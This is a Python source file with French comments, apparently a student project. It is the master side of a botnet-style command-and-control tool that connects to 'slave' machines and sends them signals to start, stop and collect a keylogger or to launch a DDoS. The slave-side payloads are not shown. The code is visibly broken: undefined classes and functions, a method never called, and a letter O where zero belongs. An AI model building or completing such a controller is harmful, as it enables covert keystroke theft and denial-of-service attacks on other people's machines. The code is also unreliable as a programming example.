#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
import socket as modSocket
import argparse

class Connexion():
    # création de l'objet connexion avec le champ machineEsclave.
    def __init__(self, machineEsclave, socket, listeAdresseIP):
        self.machineEsclave = machineEsclave
        self.socket = socket
        self.listeAdresseIP = listeAdresseIP

    #1er étape, mettre en place un canal de communication pour recevoir les messages du slave
    def listen(self):
        # création du socket pour que le master écoute sur un port afin de récupérer les adresses IP
        socket_listen = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
        # écoute sur toutes les adresses disponibles sur la machine et sur le port 60 000
        socket_listen.bind(("", 60000))
        # une fois connecté, on le met en écoute afin qu'il reçoive l'IP du slave; l'IP sera contenue dans addr
        socket_listen.listen()
        #va permettre de récupérer notre socket d'écoute
        return socket_listen

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au slave
    def receive(self, listeIP):
        # création du socket pour que le master envoie des messages au slaves via l'adresse IP récupérée
        socket_sendMessages = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
        # on définit les coordonnées sur lesquelles le master va envoyer ses instructions
        try:
            print(listeIP)#est ce vraiment utile ?
            #si la liste n'est pas vide
            if len(listeIP) != 0:
                for adresse in listeIP:
                    machineEsclave = (adresse, 60000)
                    socket_sendMessages.connect(machineEsclave)
                    print("Connection établie avec l'esclave")
            else:
                print("On ne connait pas de machine esclave")
        #except: va print "erreur" si il n'y a pas eu de connexion
        except ConnectionRefusedError:
            print("Erreur de connexion")

    # 3è étape, mettre en place l'échange de données avec une jolie boucle infinie pour ne pas stopper la connexion
    def exchange(self, socket_listen):
        # afin de recevoir l'IP, on accepte de recevoir des données
        distant_socket, addr = socket_listen.accept
        # puis on stocke l'IP récupérée dans une liste
        listeIP = []
        listeIP.append(addr[O])
        print ("L'IP du slave est : ", listeIP[0])
        #on rentre dans notre boucle infinie (c'est le seul moyen)
        while True:
            #un petit menu comme on aime
            choix = int(input("Que voulez-vous faire ? 1)Envoyer une message 2)Eteindre le serveur "))
            if choix == 1:
                message = str(input("entrez votre message"))
                master_sendMessages(liste_adresses_ip, message)
                if message == "stop":
                    liste_adresses_ip = master_listen()
                    print(liste_adresses_ip)
                    whileTrue()
            if choix == 2:
                break

"""
création de l'objet ChoixAction
avec le champ machineEsclave et s.

machineEsclave, va contenire l'adresse et le port sur lequel on va essayer de se connecter.
(petit défi pour toi. Si tu veux, essaye de faire en sorte que machineEsclave soit une liste avec plusieurs IP(differents esclaves)
et fais une boucle qui va permettre de se connecter a tous ces clients. )
s va contenire les infos sur le type de communication ect ...

Création de pusieurs methodes afin de choisir l'action a faire
sur le slave.
Ils vont tous avoir la même action a faire c'est à dire envoyer un message au client
pour activer une action.
"""

class ChoixAction(Communication):

    def __init__(self, machineEsclave):
        self.machineEsclave = machineEsclave
        self.s = s
    
    def start_log(self, s):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie keylogger au client 
        s.send("keylogger".encode("utf-8"))
        #reçois directement sa réponse
        print(s.recv(1024).decode("utf-8"))

    def ddos(self, s):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        s.send("ddos".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
    
    def stop_log(self, s):
        #idem
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        s.send("stop".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
    
    def  get_log(self, s):
        #idem
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        s.send("transfert".encode("utf-8"))
        print(s.recv(1024).decode("utf-8"))
        
    
#on initie s et machineEsclave
listeAdresseIP = []
machineEsclave = ("localhost", 5000)
s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
a = ChoixAction(machineEsclave)
#on lance la methode connexion de l'objet communication
select1 = int(input("1)connecte \n2)ecoute \nSélectionnez une option : "))
if select1 == 1:
    a.connexion(s, listeAdresseIP)
elif select1 == 2:
    a.ecoute(s, listeAdresseIP)


"""
#petit choix multiple afin de savoir quelle methode on doit lancer
select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
while select != 5:
    #on essaie le choix multiple
    try:
        if select == 1:
            #lance la methode ddos de l'objet choixAction
            a.ddos(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 2:
            #lance la methode start de l'objet choixAction
            a.start_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 3:
            #lance la methode stop de l'objet choixAction
            a.stop_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        elif select == 4:
            #lance la methode get de l'objet choixAction
            a.get_log(s)
            #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
            select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))

    #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
    except ConnectionAbortedError:
        print("connexion arretée par le client")
"""

"""
Pour rendre le code plus cool ont pourrait rajouter des arguments grace
au module argparse, on essaiera de mettre ça en place pour afficher par exemple les adresse avec
lesquels il sera connecter ect .......
À voir ce n'est pas urgent

"""

s.close()



    




